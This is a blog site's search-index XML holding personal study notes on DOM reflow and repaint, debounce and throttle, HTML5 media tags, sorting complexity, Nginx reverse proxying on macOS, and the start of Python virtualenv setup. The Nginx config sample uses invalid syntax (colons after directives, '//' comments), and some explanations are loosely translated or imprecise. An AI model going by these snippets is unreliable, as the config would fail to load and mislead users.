<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>/en/2022/02/17/DOM%20&amp;%20BOM/</url>
    <content><![CDATA[<hr>
<p>title: DOM &amp; BOM<br>date: 2021-11-04<br>categories: FrontEnd/FrontEnd<br>tags: [DOM]<br>comments: false<br>summary_img: … /cover/orange.jpg<br>summary_img: … /cover/orange.jpg<br>**This chapter introduces DOM concepts, the cost of manipulating the DOM, the mechanics of browser rendering engines, performance optimizations, and common interview questions such as throttling and anti-jitter. **</p>
<p>&lt;! –more–&gt;</p>
<h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h2 id="1-What-is-the-DOM"><a href="#1-What-is-the-DOM" class="headerlink" title="1. What is the DOM"></a>1. What is the DOM</h2><p>The <code>DOM</code> is the <code>Document Object Model</code>, <strong>Document Object Model</strong>, inside which are interfaces, i.e. methods and functions.</p>
<p>Official definition: DOM is a <strong>language-independent programmatic interface (API)</strong> for manipulating XML and HTML documents. It is mainly used in browsers to deal with HTML documents and is used to access data in the documents using the DOM API.<br>The DOM is a language-independent API, but its interface in the browser is implemented in JavaScript, and the DOM becomes an important part of the JS coding now.</p>
<h2 id="2-JS-modifying-DOM-elements-is-costly"><a href="#2-JS-modifying-DOM-elements-is-costly" class="headerlink" title="2. JS modifying DOM elements is costly"></a>2. JS modifying DOM elements is costly</h2><p>Every manipulation of the DOM is preceded by <strong>access to the DOM</strong>, so it also consumes performance.<br>On top of this, because <strong>modifying the DOM</strong> causes the browser to recalculate the geometric changes to the page, triggers a <strong>rearrangement</strong> (reflow - rollback process) and <strong>redrawing</strong> of the browser’s templating engine, which in turn consumes even more performance.</p>
<h2 id="3-How-the-browser-rendering-engine-works-and-how-it-works"><a href="#3-How-the-browser-rendering-engine-works-and-how-it-works" class="headerlink" title="3. How the browser rendering engine works and how it works"></a>3. How the browser rendering engine works and how it works</h2><p>After the browser has downloaded all the resources in the page (e.g. HTML, JavaScript, CSS, images, etc.), a 6-step process occurs as follows.</p>
<ol>
<li><p>parse the HTML and build the DOM Tree (DOM Tree)</p>
</li>
<li><p>parse the CSS to create the CSS rule tree (CSSOM Tree)</p>
</li>
<li><p>merge the DOM Tree and CSS rule tree to produce the render tree (render Tree)</p>
</li>
<li><p>layout the render tree, calculate the size and position of each element according to the generated render tree, and get the geometry information of each node. (Calculate the position and size of the elements based on the size of the viewport) (rearrangement will take this step)</p>
</li>
<li><p>draw the render tree to draw the page pixel information (get the number of pixels per node based on the geometric information of each node on the render tree) (redrawing will take this step)</p>
</li>
<li><p>the browser sends the pixel information for each layer of nodes to the GPU, which composites and draws the layers to display on the page</p>
</li>
</ol>
<h3 id="3-1-How-does-the-browser-rendering-engine-generate-the-render-tree"><a href="#3-1-How-does-the-browser-rendering-engine-generate-the-render-tree" class="headerlink" title="3.1 How does the browser rendering engine generate the render tree?"></a>3.1 How does the browser rendering engine generate the render tree?</h3><ol>
<li>traverses each visible node (except for tags such as meta, link, script, etc.; except for elements with display:none;) starting from the root of the DOM Tree</li>
<li>for each visible node, find the corresponding rule in the CSSOM and apply the style rule to the corresponding node.</li>
<li>for each visible node, and its corresponding style, combine to generate a render tree.</li>
</ol>
<p><strong>Not visible nodes:</strong> Nodes that will not render output (nodes that will not be displayed on the screen) are the following</p>
<ul>
<li>tags such as meta, link, script, etc;</li>
<li>nodes that are hidden via css, i.e. display:none; (the opacity is not visible to humans, the computer can still see it, so it will still be rendered.) (So will elements with visibility as hidden be rendered? Do a test, a div set visibility invisible, left floating, surrounded by text, to see if the text around to let out a blank area. The final test proved that a blank space was indeed created, which means that the invisibility of visibility and opacity is only invisible to the human eye, but the computer will still calculate the position information and draw it out when generating the render tree. The result of the experiment is shown below :)</li>
</ul>
<h2 id="4-What-is-browser-rendering-engine-reordering-and-redrawing"><a href="#4-What-is-browser-rendering-engine-reordering-and-redrawing" class="headerlink" title="4. What is browser rendering engine reordering and redrawing?"></a>4. What is browser rendering engine reordering and redrawing?</h2><h3 id="4-1-Reordering"><a href="#4-1-Reordering" class="headerlink" title="4.1 Reordering"></a>4.1 Reordering</h3><p>When a change in the <strong>DOM affects the geometric properties (width, height and position)</strong> of an element, the browser needs to recalculate the geometric properties of the element, and likewise the geometric properties and <strong>position</strong> of other adjacent elements will be affected as a result. The browser invalidates the affected part of the render tree and reconstructs the render tree. This process is called “reordering”.</p>
<h3 id="4-2-Redrawing"><a href="#4-2-Redrawing" class="headerlink" title="4.2 Redrawing"></a>4.2 Redrawing</h3><p>Once the reordering is complete, the browser redraws the affected parts of the screen in a process called <strong>redrawing</strong>.<br>Since reordering is the step before redrawing, it is natural that <strong>reordering will result in redrawing</strong> when it occurs.</p>
<h2 id="5-When-is-a-reorder-triggered"><a href="#5-When-is-a-reorder-triggered" class="headerlink" title="5. When is a reorder triggered?"></a>5. When is a reorder triggered?</h2><p>Reordering is required when the page layout and geometry properties change.<br>(At its core: a reorder is triggered whenever an attribute causes a change in position information)</p>
<ol>
<li><p>a visible DOM element is added or removed. (A bunch of people queuing up, adding i.e. inserting a person in the middle/deleting i.e. a person in the middle going away, will inevitably affect the position information of the people in the back of the queue)</p>
</li>
<li><p>element position change (reordering is because the position information has changed)</p>
</li>
<li><p>element size change (outer margin, inner margin, border thickness, width, height, etc.)</p>
</li>
<li><p>change in content, e.g. the amount/content of text changes, or an image is replaced by another image of a different size, font size changes, (bolded text?) Resulting in DOM element position, area change. [Calculations can consume CPU power] 5.</p>
</li>
<li><p>page renderer initialization (this is a re-run of the process, right? Definitely a re-arrangement)</p>
</li>
<li><p>Browser window size change (Position information will be forced to adjust and a re-arrangement will occur. See the gif below for a page where the position of a div element is not modified by viewport resizing, which also triggers a reorder) [consumes GPU computing power]. Experiment: resize viewport, where the position of a div element in a page is not modified by the viewport adjustment, also triggers a reorder</p>
</li>
</ol>
<h2 id="6-When-is-a-repaint-triggered"><a href="#6-When-is-a-repaint-triggered" class="headerlink" title="6. When is a repaint triggered?"></a>6. When is a repaint triggered?</h2><ol>
<li><p><strong>Relaying inevitably triggers redrawing</strong>, that’s for sure. This is because the browser’s workflow is to render after typesetting. Redraws flow back (roll back the process) to the typesetting stage, which requires the page to be redrawn afterwards.</p>
</li>
<li><p>Cases in which redrawing is triggered individually.<br>Situations other than when the size or position of an element changes, (e.g. when the font colour, background colour etc. changes). (I suspect that bold text will also trigger a redraw, but I have no evidence of this. In theory if you bold text inside a fixed size div, it should not affect the reordering of the elements that follow it, but it is possible that other adjacent text or elements inside that div will be reordered.)</p>
</li>
</ol>
<h2 id="7-Browser-performance-optimisation"><a href="#7-Browser-performance-optimisation" class="headerlink" title="7. Browser performance optimisation"></a>7. Browser performance optimisation</h2><h3 id="7-1-Optimisation"><a href="#7-1-Optimisation" class="headerlink" title="7.1 Optimisation"></a>7.1 Optimisation</h3><p>Modern browsers are pretty well established, as multiple manipulations of the DOM can trigger reordering and redrawing and consume performance. So in addition to our conscious efforts to control the number of DOM manipulations, browsers have been designed to intelligently “throttle” DOM manipulations, for example by implementing queued changes and batch execution.</p>
<p>To explain, **browsers have a “queue” to store (save) js programs that need to manipulate the DOM. Whenever js code is executed to manipulate the dom, a program is first stored in this queue. After a certain period of time, the browser then links the “ES island” and “DOM island” (that is, the JS engine to link the rendering engine) in a centralised, bulk manner, thus triggering a DOM operation. **You can think of this as “one train after another”.</p>
<h3 id="7-2-Users-interrupting-optimised-actions"><a href="#7-2-Users-interrupting-optimised-actions" class="headerlink" title="7.2 Users interrupting optimised actions"></a>7.2 Users interrupting optimised actions</h3><p>But we humans don’t perceive this, and may interrupt the browser’s “throttling” step by mistake. Forcing the browser to interrupt the current “wait” to perform an immediate dom operation. This allows the browser to hurry up and finish the JS manipulation of the DOM in its “queue” and then return the latest DOM position information to us. It’s like forcing the doors to close when you press the close button manually.</p>
<p>This happens when we get the DOM information.</p>
<p><strong>Properties that interrupt browser optimisation and force a reorder to be triggered:</strong></p>
<blockquote>
<p>offsetTop, offsetLeft, offsetWidth, offsetHeight<br>scrollTop, scrollLeft, scrollWidth, scrollHeight<br>clientTop, clientLeft, clientWidth, clientHeight<br>getComputedStyle()</p>
</blockquote>
<p>**Because it has to request the latest DOM information from the browser, the browser has to rush the JS engine to the rendering engine to perform a DOM operation. **</p>
<h2 id="8-Why-is-manipulating-the-DOM-very-expensive"><a href="#8-Why-is-manipulating-the-DOM-very-expensive" class="headerlink" title="8. Why is manipulating the DOM very expensive?"></a>8. Why is manipulating the DOM very expensive?</h2><ol>
<li>ES and DOM are two different things and each connection consumes performance</li>
<li>manipulating the DOM leads to reordering and redrawing, which consumes CPU; redrawing consumes GPU</li>
</ol>
<h2 id="9-Anti-jitter-amp-throttling-—-from-SegmentFault-Ange"><a href="#9-Anti-jitter-amp-throttling-—-from-SegmentFault-Ange" class="headerlink" title="9. Anti-jitter &amp; throttling — from SegmentFault-Ange"></a>9. Anti-jitter &amp; throttling — from SegmentFault-Ange</h2><h3 id="9-1-Explanation"><a href="#9-1-Explanation" class="headerlink" title="9.1 Explanation"></a>9.1 Explanation</h3><p>Case in point: **Most websites will provide such a button: for returning to the top. **</p>
<p>This button will only appear after scrolling to a certain position from the top, so let’s now abstract this functional requirement - <strong>Listen to the browser scroll event and return the distance between the current scrollbar and the top</strong>. This could be implemented with a function.</p>
<p>However, a problem will be found when running it:** The default execution frequency of this function, too ! high! too! ** How high is it? In Chrome, for example, we can click to select the scrollbar of a page, then click once on the [down arrow key] of the keyboard, and find that the function executes <strong>8-9 times</strong>!</p>
<p>However in reality we don’t need such high frequency feedback, after all the performance of the browser is limited and shouldn’t be wasted, so moving on to discuss how to optimise this scenario.</p>
<h3 id="9-2-Anti-debounce"><a href="#9-2-Anti-debounce" class="headerlink" title="9.2 Anti-debounce"></a>9.2 Anti-debounce</h3><p><strong>In short, debounce is the process of not executing immediately if a large number of the same events are triggered in a short period of time, but waiting a given amount of time before executing, and then retiming if the event is hit again within a given amount of time</strong>.</p>
<p>Based on the above scenario, the first idea is first proposed: <strong>Instead of executing the function immediately when the event is triggered for the first time, a deadline value of say 200ms</strong> is given and then.</p>
<ul>
<li>If the scroll event is not triggered again within 200ms, then the function is executed</li>
<li>If the scroll event is triggered again within 200ms, then the current timing is cancelled and the timing starts again</li>
</ul>
<p><strong>Effect</strong>: if the same event is triggered in large numbers in a short period of time, the function will only be executed once.</p>
<h3 id="9-3-Throttle"><a href="#9-3-Throttle" class="headerlink" title="9.3 Throttle"></a>9.3 Throttle</h3><p><strong>In short, a throttle is a function that is executed once at the same interval</strong> if a large number of the same events are triggered in a short period of time.</p>
<p>Continuing with this thought, the result of using the anti-throttling scheme above to deal with the problem is that</p>
<ul>
<li>If a scroll event is constantly triggered for a limited period of time (e.g. some user is idle and holds down the scroll and keeps dragging it around), the current distance to the top will theoretically never be output as long as the triggering does not stop.</li>
</ul>
<p>New requirement: **What about giving feedback after a certain time interval even if the user keeps dragging the scroll bar? **</p>
<p>It’s actually quite simple: we could design a function that <strong>similar to a control valve that opens periodically, i.e. let the function execute once and then temporarily deactivate for a certain period of time, and reactivate after that time</strong> (similar to a skill cooldown).</p>
<p><strong>Effect</strong>: if the same event is triggered in large numbers over a short period of time, then <strong>after the function is executed once, the function does not work again</strong> for a specified period of time, and does not re-activate until after that time.</p>
]]></content>
  </entry>
  <entry>
    <title>HTML基础---学习手记</title>
    <url>/en/2021/09/22/HTML%E5%AD%A6%E4%B9%A0%E6%89%8B%E8%AE%B0/</url>
    <content><![CDATA[<p><strong>关于HTML一些生疏和不常见的知识，简单汇总一下。</strong></p>
<a id="more"></a>

<h2 id="HTML布局元素"><a href="#HTML布局元素" class="headerlink" title="HTML布局元素"></a>HTML布局元素</h2><blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">main</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">article</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">   </span><br><span class="line">   <span class="tag">&lt;<span class="name">aside</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">footer</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/Users/arieskoo/Downloads/1-Self-Learning/Blog/%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD/Layout.jpg" alt="Layout"></p>
</blockquote>
<h2 id="多媒体嵌入"><a href="#多媒体嵌入" class="headerlink" title="多媒体嵌入"></a>多媒体嵌入</h2><h3 id="图片—img"><a href="#图片—img" class="headerlink" title="图片—img"></a>图片—img</h3><p> 为图片提供一个语义容器，在标题和图片之间建立清晰的关联，使用HTML5 的<figure>和<figcaption>元素。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">figure</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;当图片无法显示时&quot;</span> <span class="attr">title</span>=<span class="string">&quot;当鼠标悬浮在图片时说明图片&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">figcaption</span>&gt;</span>说明图片的描述文字<span class="tag">&lt;/<span class="name">figcaption</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">figure</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="视频和音频—video-amp-audio"><a href="#视频和音频—video-amp-audio" class="headerlink" title="视频和音频—video&amp;audio"></a>视频和音频—video&amp;audio</h2><h3 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;视频资源地址&quot;</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    不支持视频时显示</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><em>controls</em> 显示浏览器提供的控件界面</p>
<h4 id="使用多个播放源以提高兼容性"><a href="#使用多个播放源以提高兼容性" class="headerlink" title="使用多个播放源以提高兼容性"></a>使用多个播放源以提高兼容性</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    浏览器不支持该视频时显示</span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p> WebM 和 MP4 两种格式在目前已经足够支持大多数平台和浏览器。</p>
<h4 id="其他video特性—H5"><a href="#其他video特性—H5" class="headerlink" title="其他video特性—H5"></a>其他video特性—H5</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">autoplay</span> <span class="attr">loop</span> <span class="attr">muted</span></span></span><br><span class="line"><span class="tag">       <span class="attr">poster</span>=<span class="string">&quot;address&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/mp4&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span> <span class="attr">type</span>=<span class="string">&quot;video/webm&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>你的浏览器不支持 HTML5 视频。可点击<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;rabbit320.mp4&quot;</span>&gt;</span>此链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span>观看<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><em>poster</em>—视频的封面</p>
<h3 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">controls</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/mp3&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;audio/ogg&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>你的浏览器不支持 HTML5 音频时显示<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>audio没有视觉部件，所以除了不支持width、height和poster之外，它支持video所以video标签拥有的特性。</p>
<h3 id="Iframe元素—嵌入技术"><a href="#Iframe元素—嵌入技术" class="headerlink" title="Iframe元素—嵌入技术"></a>Iframe元素—嵌入技术</h3><p>embed和object元素主要用来嵌入PDF和SVG、Flash，但现今它们都在逐渐被淘汰，只有iframe现在经常还被使用。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;address&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;500&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">allowfullscreen</span> <span class="attr">sandbox</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;address&quot;</span>&gt;</span></span><br><span class="line">    Fallback link for browsers that don&#x27;t support iframes</span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>**<em>allowfullscreen:</em> **允许进行全屏展示</p>
<p><em><strong>frameborder:</strong></em> 绘制边框（推荐在CSS中用border）</p>
<p><em><strong>sandbox:</strong></em> 提高安全性</p>
<h3 id="响应式图片"><a href="#响应式图片" class="headerlink" title="响应式图片"></a>响应式图片</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">srcset</span>=<span class="string">&quot;elva-fairy-320w.jpg 320w,</span></span></span><br><span class="line"><span class="tag"><span class="string">             elva-fairy-480w.jpg 480w,</span></span></span><br><span class="line"><span class="tag"><span class="string">             elva-fairy-800w.jpg 800w&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">sizes</span>=<span class="string">&quot;(max-width: 320px) 280px,</span></span></span><br><span class="line"><span class="tag"><span class="string">            (max-width: 480px) 440px,</span></span></span><br><span class="line"><span class="tag"><span class="string">            800px&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">src</span>=<span class="string">&quot;elva-fairy-800w.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Elva dressed as a fairy&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><em><strong>srcset:</strong></em> 图像地址 固有宽度（以w为单位）</p>
<p><em><strong>sizes:</strong></em> (媒体条件) 槽的宽度（条件为真时）</p>
<p><strong>运行机制：</strong></p>
<pre><code>                1. 检查设备宽度
                2. 检查sizes列表中哪个媒体条件第一个为真
                3. 查看对应的槽宽度
                4. 加载srcset列表中最接近该槽大小的图像
</code></pre>
]]></content>
      <categories>
        <category>Frontend/前端</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>Handy CheatSheet</title>
    <url>/en/2021/10/27/Handy-CheatSheet/</url>
    <content><![CDATA[<h1 id="Algorithm-Time-Complexity"><a href="#Algorithm-Time-Complexity" class="headerlink" title="Algorithm Time Complexity"></a>Algorithm Time Complexity</h1><table>
<thead>
<tr>
<th align="center">Algorithm</th>
<th align="center">Best Time Complexity</th>
<th align="center">Ave TC</th>
<th align="center">Worst TC</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Selection Sort</td>
<td align="center">Ω($n^2$)</td>
<td align="center">Θ($n^2$)</td>
<td align="center"><strong>O($n^2$)</strong></td>
</tr>
<tr>
<td align="center">Bubble Sort</td>
<td align="center">Ω($n$)</td>
<td align="center">Θ($n^2$)</td>
<td align="center"><strong>O($n^2$)</strong></td>
</tr>
<tr>
<td align="center">Insertion Sort</td>
<td align="center">Ω($n$)</td>
<td align="center">Θ($n^2$)</td>
<td align="center"><strong>O($n^2$)</strong></td>
</tr>
<tr>
<td align="center"><strong>Heap Sort</strong></td>
<td align="center">Ω($nlogn$)</td>
<td align="center">Θ($nlogn$)</td>
<td align="center"><strong>O($nlogn$)</strong></td>
</tr>
<tr>
<td align="center"><strong>Quick Sort</strong></td>
<td align="center">Ω($nlogn$)</td>
<td align="center">Θ($nlogn$)</td>
<td align="center"><strong>O($n^2$)</strong></td>
</tr>
<tr>
<td align="center"><strong>Merge Sort</strong></td>
<td align="center">Ω($nlogn$)</td>
<td align="center">Θ($nlogn$)</td>
<td align="center"><strong>O($nlogn$)</strong></td>
</tr>
<tr>
<td align="center">Bucket Sort</td>
<td align="center">Ω($n+k$)</td>
<td align="center">Θ($n+k$)</td>
<td align="center">O($n^2$)</td>
</tr>
<tr>
<td align="center">Radix Sort</td>
<td align="center">Ω($nk$)</td>
<td align="center">Θ($nk$)</td>
<td align="center">O($nk$)</td>
</tr>
</tbody></table>
<a id="more"></a>

<h1 id="Time-Complexity-Rank"><a href="#Time-Complexity-Rank" class="headerlink" title="Time Complexity Rank"></a>Time Complexity Rank</h1><ol>
<li>O($logn$)    ——————–    e.g. Binary Tree</li>
<li>O($n$)          ——————–    e.g. Simple Search</li>
<li>O($nlogn$)  ——————–    e.g. Quick Sort</li>
</ol>
<hr>
<ol start="4">
<li>O($n^2$)        ——————–     e.g. Selection Sort (Not Recommended Time Complexity)</li>
</ol>
<h1 id="Java-IDEA-IDE-ShortCut"><a href="#Java-IDEA-IDE-ShortCut" class="headerlink" title="Java IDEA IDE ShortCut"></a>Java IDEA IDE ShortCut</h1><ol>
<li>sout + enter</li>
<li>psvm + enter</li>
<li>fori + enter</li>
<li>iter + enter</li>
</ol>
]]></content>
      <categories>
        <category>Algorithm/算法</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>My first blog</title>
    <url>/en/2021/02/14/My-first-blog/</url>
    <content><![CDATA[<p>##Fist Charpter</p>
<p>content</p>
<hr>
<p>##Second Charpter</p>
<p>content</p>
<hr>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>content</p>
<p>:wq</p>
]]></content>
  </entry>
  <entry>
    <title>基于MAC的NGINX配置使用---反向代理解决跨域</title>
    <url>/en/2021/10/19/Nignx%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p><strong>关于Engine X（即Nignx）代理服务器配置说明</strong></p>
<a id="more"></a>

<h1 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h1><ol>
<li><p>Terminal执行以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew search nginx</span><br><span class="line">brew install nginx</span><br></pre></td></tr></table></figure></li>
<li><p>安装完成后，Terminal输出信息如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docroot is: &#x2F;usr&#x2F;local&#x2F;var&#x2F;www</span><br><span class="line"></span><br><span class="line">The default port has been set in &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;nginx.conf to 8080 so that</span><br><span class="line">nginx can run without sudo.</span><br><span class="line"></span><br><span class="line">nginx will load all files in &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;servers&#x2F;.</span><br><span class="line"></span><br><span class="line">To start nginx:</span><br><span class="line">  brew services start nginx</span><br><span class="line">Or, if you don&#39;t want&#x2F;need a background service you can just run:</span><br><span class="line">  &#x2F;usr&#x2F;local&#x2F;opt&#x2F;nginx&#x2F;bin&#x2F;nginx -g &#39;daemon off;&#39;</span><br></pre></td></tr></table></figure>
<h1 id="启动Nginx"><a href="#启动Nginx" class="headerlink" title="启动Nginx"></a>启动Nginx</h1></li>
<li><p>第一次安装后启动nginx，Terminal执行以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew services start nginx</span><br></pre></td></tr></table></figure>
<p>以后再次启动nginx只需执行以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nginx</span><br></pre></td></tr></table></figure>
<p><strong>注：</strong>如果出现不成功的情况，可采取以下方法：先结束主进程再重启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -ax | grep nginx # 查看进程号</span><br><span class="line">sudo kill -s QUIT 主进程ID号</span><br><span class="line">sudo nginx</span><br></pre></td></tr></table></figure></li>
<li><p>访问Nginx默认端口8080</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">localhost:8080</span><br></pre></td></tr></table></figure></li>
<li><p>其他常用命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx -s stop # 停止nginx</span><br><span class="line">nginx -s reload # 重启nginx</span><br><span class="line">nginx # 启动nginx</span><br></pre></td></tr></table></figure></li>
<li><p>配置<code>nginx.conf</code>文件</p>
<ul>
<li><p>进入Finder，按住<code>shift</code>+<code>command</code>+G，然后搜索<code>local/etc</code>，找到nginx文件夹</p>
</li>
<li><p>找到nginx.conf文件，进入修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">	listen: 80; &#x2F;&#x2F; 默认80端口，选择一个未被使用的接口即可</span><br><span class="line">	server_name: localhost;</span><br><span class="line">	</span><br><span class="line">	location &#x2F;&#123;</span><br><span class="line">		proxy_pass http:&#x2F;&#x2F;yourfronend.com; &#x2F;&#x2F; 此处为你浏览器所在的地址</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	location &#x2F;api&#123;</span><br><span class="line">		proxy_pass http:&#x2F;&#x2F;yourbackend.com; &#x2F;&#x2F; 此处为你浏览器所请求的地址</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>保存文件，重启Nginx</p>
</li>
<li><p>访问Nignx的监听端口，本例为<code>http://localhost:80</code></p>
</li>
<li><p>你会看到前端地址所在的内容</p>
</li>
<li><p>进行跨域测试</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Frontend/前端</category>
      </categories>
      <tags>
        <tag>ClientServer</tag>
      </tags>
  </entry>
  <entry>
    <title>Python virtualenv notes</title>
    <url>/en/2021/02/20/Python%20virtualenv%20notes/</url>
    <content><![CDATA[<h1 id="Python3-virtual-environment-construction"><a href="#Python3-virtual-environment-construction" class="headerlink" title="Python3 virtual environment construction"></a>Python3 virtual environment construction</h1><a id="more"></a>

<h2 id="1-Perface"><a href="#1-Perface" class="headerlink" title="1. Perface"></a>1. Perface</h2><ul>
<li><h3 id="Why-do-we-need-virtual-environment"><a href="#Why-do-we-need-virtual-environment" class="headerlink" title="Why do we need virtual environment"></a>Why do we need virtual environment</h3><p>Simply put, an individual virtual environment can be used by an individual python project so that every project won’t affect each other and also won’t affect the python system environment.</p>
</li>
<li><h3 id="Why-do-we-use-‘virtualenv’"><a href="#Why-do-we-use-‘virtualenv’" class="headerlink" title="Why do we use ‘virtualenv’"></a>Why do we use ‘virtualenv’</h3><p>In short, it’s the python official recommendation.</p>
</li>
</ul>
<hr>
